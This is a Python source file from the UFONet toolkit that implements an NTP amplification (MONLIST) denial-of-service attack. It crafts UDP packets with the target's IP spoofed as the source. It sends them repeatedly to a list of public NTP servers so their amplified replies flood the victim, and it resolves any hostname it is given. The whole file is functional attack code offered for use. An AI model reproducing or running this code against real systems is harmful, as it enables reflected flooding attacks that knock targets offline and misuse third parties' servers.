#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random
try:
    from scapy.all import *
except:
    print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
    sys.exit(2)

ntp_file = "botnet/ntp.txt" # NTP servers IP list

#data = "\x17\x00\x03\x2a" + "\x00" * 4 # NTP v2 Monlist 'magic' packet!
data = "\x1b\x00\x00\x00"+"\x00"*11*4 # NTP v3 Monlist 'magic' packet!

# UFONet NTP Amplification (MONLIST) / [Port: 123]
def monlistize(ip, rounds):
    n=0
    try: # (NTP) Amplification attack uses publically accessible NTP servers to flood a target with NTP response traffic
        with open(ntp_file) as f: # extract NTP servers from file
            ntp_d = f.read().splitlines()
        f.close()
        p_num=0
        for x in range (0,int(rounds)):
            try:
                n=n+1
                print("[Info] [AI] [MONLIST] Breaking NTP 'parsec' ["+str(n)+"] and remaking space-time on it! -> [SLOWING!]")
                for j in ntp_d:
                    p_num += 1
                    packet = IP(dst=j,src=ip)/UDP(sport=random.randint(2000,65535),dport=123)/Raw(load=data)
                    try:
                        send(packet, verbose=0) # not using sr1 because non-replies are required
                        print(("[Info] [AI] [MONLIST] Broken NTP 'parsec' [{}]".format(p_num))+" IS INTERACTING WITH ["+str(j)+"] -> [AMPLIFYING!]")
                    except:
                        print(("[Info] [AI] [MONLIST] Broken NTP 'parsec' [{}]".format(p_num))+" HAS FAILED to interact with ["+str(j)+"] -> [PASSING!]")
            except:
                print("[Error] [AI] [MONLIST] Failed breaking NTP 'parsec' ["+str(n)+"]")
    except:
        print("[Error] [AI] [MONLIST] Failing to engage... -> Is still target online? -> [Checking!]")

class MONLIST(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] NTP Amplification (MONLIST) is ready to broke: [" , rounds, "parsecs ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
        elif target.startswith('https://'):
            target = target.replace('https://','')
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [MONLIST] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        monlistize(ip, rounds) # attack with MONLIST using threading
